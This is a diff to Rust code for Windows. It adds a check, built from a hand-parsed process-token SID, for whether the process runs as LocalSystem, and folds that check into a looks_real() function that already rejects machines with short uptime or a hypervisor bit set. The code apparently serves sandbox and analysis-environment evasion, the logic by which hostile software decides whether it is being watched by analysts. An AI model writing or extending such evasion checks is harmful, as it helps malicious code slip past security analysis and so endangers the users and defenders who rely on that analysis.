@@ -18,6 +18,47 @@ unsafe fn hypervisor_bit_set() -> bool {
 }
 
 #[cfg(target_os = "windows")]
+unsafe fn running_as_system() -> bool {
+    use windows_sys::Win32::{
+        Foundation::CloseHandle,
+        Security::{
+            GetTokenInformation, OpenProcessToken, TOKEN_QUERY, TOKEN_USER,
+            TokenUser,
+        },
+        System::Threading::GetCurrentProcess,
+    };
+
+    let mut token_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) == 0 {
+        return false;
+    }
+
+    let mut buf = vec![0u8; 256];
+    let mut return_len = 0u32;
+    let ok = GetTokenInformation(
+        token_handle,
+        TokenUser,
+        buf.as_mut_ptr() as _,
+        buf.len() as u32,
+        &mut return_len,
+    );
+    CloseHandle(token_handle);
+    if ok == 0 { return false; }
+
+    // TOKEN_USER.User.Sid points to a SID. S-1-5-18 (LocalSystem) has:
+    // Revision=1, SubAuthorityCount=1, IdentifierAuthority={0,0,0,0,0,5}, SubAuthority[0]=18
+    let sid_ptr = *(buf.as_ptr() as *const *const u8);
+    if sid_ptr.is_null() { return false; }
+    let revision      = *sid_ptr;
+    let sub_auth_cnt  = *sid_ptr.add(1);
+    let auth_6        = *sid_ptr.add(7); // IdentifierAuthority[5] = 5
+    let sub_auth_0    = u32::from_le_bytes([
+        *sid_ptr.add(8), *sid_ptr.add(9), *sid_ptr.add(10), *sid_ptr.add(11),
+    ]);
+    revision == 1 && sub_auth_cnt == 1 && auth_6 == 5 && sub_auth_0 == 18
+}
+
+#[cfg(target_os = "windows")]
 pub unsafe fn looks_real() -> bool {
     // Uptime check: at least 30 minutes
     let uptime_ms = GetTickCount64();
@@ -36,6 +77,9 @@ pub unsafe fn looks_real() -> bool {
 
     #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
     if hypervisor_bit_set() { return false; }
+
+    #[cfg(target_os = "windows")]
+    if running_as_system() { return false; }
 
     true
 }
